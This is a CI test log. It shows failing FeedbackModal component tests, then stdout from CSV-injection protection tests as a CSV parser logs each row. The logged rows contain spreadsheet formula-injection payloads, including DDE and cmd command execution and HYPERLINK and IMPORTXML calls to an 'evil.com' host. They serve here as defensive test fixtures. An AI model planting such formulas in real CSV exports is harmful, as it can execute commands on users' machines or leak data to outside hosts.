2025-11-18T17:35:40.3730675Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3731191Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3732031Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas type selector buttons[39m
2025-11-18T17:35:40.3732734Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3733242Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3734064Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas screenshot upload area[39m
2025-11-18T17:35:40.3734763Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3735756Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3738269Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates type when buttons are clicked[39m
2025-11-18T17:35:40.3739707Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3740757Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3742377Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates description when typing[39m
2025-11-18T17:35:40.3743632Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3744481Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3746002Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows error when submitting empty description[39m
2025-11-18T17:35:40.3747752Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3748691Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3750080Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhandles file selection[39m
2025-11-18T17:35:40.3751264Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3752385Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3753935Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrejects files larger than 5MB[39m
2025-11-18T17:35:40.3755161Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3756056Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3757774Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when close button is clicked[39m
2025-11-18T17:35:40.3759082Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3759964Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3761546Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when cancel button is clicked[39m
2025-11-18T17:35:40.3762851Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3763733Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3765300Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdisables submit button when submitting[39m
2025-11-18T17:35:40.3766560Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3767655Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3769361Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows success state after successful submission[39m
2025-11-18T17:35:40.3785377Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3786447Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:41.1070182Z  [33m❯[39m e2e/tests/consultant-groups.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:41.5348719Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with equals sign[22m[39m
2025-11-18T17:35:41.5364373Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5365604Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5375778Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5377103Z }
2025-11-18T17:35:41.5378323Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5379231Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5379714Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5380686Z   cellValues: [ [32m'test@example.com'[39m, [32m'=SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5381480Z   columnMapping: {
2025-11-18T17:35:41.5381876Z     email: [33m0[39m,
2025-11-18T17:35:41.5382280Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5382692Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5383093Z     role: [33m3[39m,
2025-11-18T17:35:41.5383456Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5383994Z     password: [33m-1[39m
2025-11-18T17:35:41.5384315Z   }
2025-11-18T17:35:41.5384556Z }
2025-11-18T17:35:41.5384900Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5385496Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5386077Z   firstName: [32m'=SUM(A1:A10)'[39m,
2025-11-18T17:35:41.5386650Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5387453Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5387996Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5388391Z }
2025-11-18T17:35:41.5388757Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5389508Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5390596Z   cellValues: [ [32m'user@example.com'[39m, [32m'Normal'[39m, [32m'=CONCATENATE(A1;B1)'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5391362Z   columnMapping: {
2025-11-18T17:35:41.5391760Z     email: [33m0[39m,
2025-11-18T17:35:41.5392174Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5392630Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5393187Z     role: [33m3[39m,
2025-11-18T17:35:41.5393627Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5394080Z     password: [33m-1[39m
2025-11-18T17:35:41.5394453Z   }
2025-11-18T17:35:41.5394758Z }
2025-11-18T17:35:41.5395156Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5395778Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5396326Z   firstName: [32m'Normal'[39m,
2025-11-18T17:35:41.5397117Z   lastName: [32m'=CONCATENATE(A1;B1)'[39m,
2025-11-18T17:35:41.5397509Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5397778Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5397987Z }
2025-11-18T17:35:41.5398093Z 
2025-11-18T17:35:41.5398983Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with plus sign[22m[39m
2025-11-18T17:35:41.5399751Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5400272Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5400954Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5401357Z }
2025-11-18T17:35:41.5402067Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5402606Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5402859Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5403375Z   cellValues: [ [32m'test@example.com'[39m, [32m'+SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5403778Z   columnMapping: {
2025-11-18T17:35:41.5403998Z     email: [33m0[39m,
2025-11-18T17:35:41.5404227Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5404454Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5404673Z     role: [33m3[39m,
2025-11-18T17:35:41.5404886Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5405106Z     password: [33m-1[39m
2025-11-18T17:35:41.5405291Z   }
2025-11-18T17:35:41.5405438Z }
2025-11-18T17:35:41.5405643Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5406472Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5407278Z   firstName: [32m'+SUM(A1:A10)'[39m,
2025-11-18T17:35:41.5407858Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5408362Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5408833Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5409215Z }
2025-11-18T17:35:41.5409569Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5410041Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5410924Z   cellValues: [ [32m'user@example.com'[39m, [32m'Normal'[39m, [32m'+cmd'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5411610Z   columnMapping: {
2025-11-18T17:35:41.5412010Z     email: [33m0[39m,
2025-11-18T17:35:41.5412377Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5412758Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5413127Z     role: [33m3[39m,
2025-11-18T17:35:41.5413457Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5413804Z     password: [33m-1[39m
2025-11-18T17:35:41.5414107Z   }
2025-11-18T17:35:41.5414339Z }
2025-11-18T17:35:41.5414683Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5415207Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5415789Z   firstName: [32m'Normal'[39m,
2025-11-18T17:35:41.5416207Z   lastName: [32m'+cmd'[39m,
2025-11-18T17:35:41.5416621Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5417308Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5417671Z }
2025-11-18T17:35:41.5417825Z 
2025-11-18T17:35:41.5419641Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with minus sign[22m[39m
2025-11-18T17:35:41.5420971Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5421858Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5423039Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5423697Z }
2025-11-18T17:35:41.5424954Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5425866Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5426298Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5427330Z   cellValues: [ [32m'test@example.com'[39m, [32m'-2+5'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5427996Z   columnMapping: {
2025-11-18T17:35:41.5428378Z     email: [33m0[39m,
2025-11-18T17:35:41.5428757Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5429163Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5429545Z     role: [33m3[39m,
2025-11-18T17:35:41.5429902Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5430263Z     password: [33m-1[39m
2025-11-18T17:35:41.5430585Z   }
2025-11-18T17:35:41.5430823Z }
2025-11-18T17:35:41.5431173Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5431688Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5432210Z   firstName: [32m'-2+5'[39m,
2025-11-18T17:35:41.5432676Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5433119Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5433574Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5433918Z }
2025-11-18T17:35:41.5434223Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5434648Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5435495Z   cellValues: [ [32m'user@example.com'[39m, [32m'Normal'[39m, [32m'-cmd'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5436145Z   columnMapping: {
2025-11-18T17:35:41.5436516Z     email: [33m0[39m,
2025-11-18T17:35:41.5437142Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5437580Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5437970Z     role: [33m3[39m,
2025-11-18T17:35:41.5438337Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5438718Z     password: [33m-1[39m
2025-11-18T17:35:41.5439046Z   }
2025-11-18T17:35:41.5439284Z }
2025-11-18T17:35:41.5439645Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5440409Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5440924Z   firstName: [32m'Normal'[39m,
2025-11-18T17:35:41.5441356Z   lastName: [32m'-cmd'[39m,
2025-11-18T17:35:41.5441766Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5442212Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5442556Z }
2025-11-18T17:35:41.5442689Z 
2025-11-18T17:35:41.5444224Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with at sign[22m[39m
2025-11-18T17:35:41.5445483Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5446382Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5447766Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5448427Z }
2025-11-18T17:35:41.5449657Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5450574Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5450995Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5451920Z   cellValues: [ [32m'test@example.com'[39m, [32m'@SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5452590Z   columnMapping: {
2025-11-18T17:35:41.5453116Z     email: [33m0[39m,
2025-11-18T17:35:41.5453518Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5453909Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5454294Z     role: [33m3[39m,
2025-11-18T17:35:41.5454640Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5455027Z     password: [33m-1[39m
2025-11-18T17:35:41.5455340Z   }
2025-11-18T17:35:41.5455591Z }
2025-11-18T17:35:41.5455928Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5456443Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5457197Z   firstName: [32m'@SUM(A1:A10)'[39m,
2025-11-18T17:35:41.5457712Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5458131Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5458593Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5458931Z }
2025-11-18T17:35:41.5459242Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5459658Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5460492Z   cellValues: [ [32m'user@example.com'[39m, [32m'Normal'[39m, [32m'@cmd'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5461166Z   columnMapping: {
2025-11-18T17:35:41.5461526Z     email: [33m0[39m,
2025-11-18T17:35:41.5461914Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5462307Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5462683Z     role: [33m3[39m,
2025-11-18T17:35:41.5463032Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5463405Z     password: [33m-1[39m
2025-11-18T17:35:41.5463719Z   }
2025-11-18T17:35:41.5463967Z }
2025-11-18T17:35:41.5464321Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5464820Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5465324Z   firstName: [32m'Normal'[39m,
2025-11-18T17:35:41.5465766Z   lastName: [32m'@cmd'[39m,
2025-11-18T17:35:41.5466173Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5466626Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5467114Z }
2025-11-18T17:35:41.5467257Z 
2025-11-18T17:35:41.5468845Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with tab character[22m[39m
2025-11-18T17:35:41.5470169Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5471104Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5472306Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5472967Z }
2025-11-18T17:35:41.5474187Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5475352Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5475837Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5476694Z   cellValues: [ [32m'test@example.com'[39m, [32m'\tSUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5477579Z   columnMapping: {
2025-11-18T17:35:41.5477928Z     email: [33m0[39m,
2025-11-18T17:35:41.5478291Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5478665Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5479014Z     role: [33m3[39m,
2025-11-18T17:35:41.5479350Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5479696Z     password: [33m-1[39m
2025-11-18T17:35:41.5479995Z   }
2025-11-18T17:35:41.5480220Z }
2025-11-18T17:35:41.5480555Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5481033Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5481567Z   firstName: [32m'\tSUM(A1:A10)'[39m,
2025-11-18T17:35:41.5482080Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5482639Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5483132Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5483479Z }
2025-11-18T17:35:41.5483622Z 
2025-11-18T17:35:41.5485286Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mFormula Prevention[2m > [22m[2mshould sanitize cells starting with carriage return[22m[39m
2025-11-18T17:35:41.5487092Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5488165Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5489467Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5490208Z }
2025-11-18T17:35:41.5491470Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5492487Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5492994Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5493985Z   cellValues: [ [32m'test@example.com'[39m, [32m'\rSUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5494765Z   columnMapping: {
2025-11-18T17:35:41.5495159Z     email: [33m0[39m,
2025-11-18T17:35:41.5495572Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5496002Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5496414Z     role: [33m3[39m,
2025-11-18T17:35:41.5497049Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5497494Z     password: [33m-1[39m
2025-11-18T17:35:41.5497848Z   }
2025-11-18T17:35:41.5498112Z }
2025-11-18T17:35:41.5498483Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5499040Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5499613Z   firstName: [32m'\rSUM(A1:A10)'[39m,
2025-11-18T17:35:41.5500150Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.5500604Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5501093Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5501471Z }
2025-11-18T17:35:41.5501622Z 
2025-11-18T17:35:41.5503371Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mComplex Formula Attacks[2m > [22m[2mshould protect against Excel formula injection[22m[39m
2025-11-18T17:35:41.5504764Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5505736Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5507184Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5507858Z }
2025-11-18T17:35:41.5509129Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5510106Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5510543Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5511479Z   cellValues: [ [32m'evil@hacker.com'[39m, [32m"=cmd|'/c calc'!A0"[39m, [32m'Victim'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5512418Z   columnMapping: {
2025-11-18T17:35:41.5512800Z     email: [33m0[39m,
2025-11-18T17:35:41.5513191Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5513602Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5513994Z     role: [33m3[39m,
2025-11-18T17:35:41.5514366Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5514754Z     password: [33m-1[39m
2025-11-18T17:35:41.5515087Z   }
2025-11-18T17:35:41.5515336Z }
2025-11-18T17:35:41.5515760Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5516303Z   email: [32m'evil@hacker.com'[39m,
2025-11-18T17:35:41.5517075Z   firstName: [32m"=cmd|'/c calc'!A0"[39m,
2025-11-18T17:35:41.5517624Z   lastName: [32m'Victim'[39m,
2025-11-18T17:35:41.5518065Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5518534Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5518886Z }
2025-11-18T17:35:41.5519205Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5519638Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5519996Z   cellValues: [
2025-11-18T17:35:41.5520418Z     [32m'evil2@hacker.com'[39m,
2025-11-18T17:35:41.5521036Z     [32m'=HYPERLINK(http://evil.com; Click me)'[39m,
2025-11-18T17:35:41.5521567Z     [32m'User'[39m,
2025-11-18T17:35:41.5521969Z     [32m'docente'[39m
2025-11-18T17:35:41.5522291Z   ],
2025-11-18T17:35:41.5522580Z   columnMapping: {
2025-11-18T17:35:41.5523165Z     email: [33m0[39m,
2025-11-18T17:35:41.5523614Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5524040Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5524439Z     role: [33m3[39m,
2025-11-18T17:35:41.5524822Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5525221Z     password: [33m-1[39m
2025-11-18T17:35:41.5525560Z   }
2025-11-18T17:35:41.5525824Z }
2025-11-18T17:35:41.5526201Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5526916Z   email: [32m'evil2@hacker.com'[39m,
2025-11-18T17:35:41.5527648Z   firstName: [32m'=HYPERLINK(http://evil.com; Click me)'[39m,
2025-11-18T17:35:41.5528274Z   lastName: [32m'User'[39m,
2025-11-18T17:35:41.5528715Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5529193Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5529552Z }
2025-11-18T17:35:41.5529710Z 
2025-11-18T17:35:41.5531445Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mComplex Formula Attacks[2m > [22m[2mshould protect against Google Sheets DDE attacks[22m[39m
2025-11-18T17:35:41.5532855Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5533814Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5535068Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5535768Z }
2025-11-18T17:35:41.5537302Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5538306Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5538772Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5539125Z   cellValues: [
2025-11-18T17:35:41.5539552Z     [32m'attacker@evil.com'[39m,
2025-11-18T17:35:41.5540093Z     [32m'=DDE(cmd;/C calc;cmd)'[39m,
2025-11-18T17:35:41.5540588Z     [32m'Innocent'[39m,
2025-11-18T17:35:41.5541002Z     [32m'docente'[39m
2025-11-18T17:35:41.5541321Z   ],
2025-11-18T17:35:41.5541615Z   columnMapping: {
2025-11-18T17:35:41.5542003Z     email: [33m0[39m,
2025-11-18T17:35:41.5542409Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5542827Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5543235Z     role: [33m3[39m,
2025-11-18T17:35:41.5543613Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5544009Z     password: [33m-1[39m
2025-11-18T17:35:41.5544344Z   }
2025-11-18T17:35:41.5544604Z }
2025-11-18T17:35:41.5544972Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5545527Z   email: [32m'attacker@evil.com'[39m,
2025-11-18T17:35:41.5546333Z   firstName: [32m'=DDE(cmd;/C calc;cmd)'[39m,
2025-11-18T17:35:41.5547078Z   lastName: [32m'Innocent'[39m,
2025-11-18T17:35:41.5547558Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5548043Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5548405Z }
2025-11-18T17:35:41.5548715Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5549156Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5549508Z   cellValues: [
2025-11-18T17:35:41.5549971Z     [32m'attacker2@evil.com'[39m,
2025-11-18T17:35:41.5550597Z     [32m'=IMPORTXML(http://evil.com/xml; //data)'[39m,
2025-11-18T17:35:41.5551117Z     [32m'Name'[39m,
2025-11-18T17:35:41.5551477Z     [32m'docente'[39m
2025-11-18T17:35:41.5551787Z   ],
2025-11-18T17:35:41.5552065Z   columnMapping: {
2025-11-18T17:35:41.5552426Z     email: [33m0[39m,
2025-11-18T17:35:41.5552821Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5553242Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5553630Z     role: [33m3[39m,
2025-11-18T17:35:41.5553994Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5554381Z     password: [33m-1[39m
2025-11-18T17:35:41.5554712Z   }
2025-11-18T17:35:41.5554957Z }
2025-11-18T17:35:41.5555305Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5555830Z   email: [32m'attacker2@evil.com'[39m,
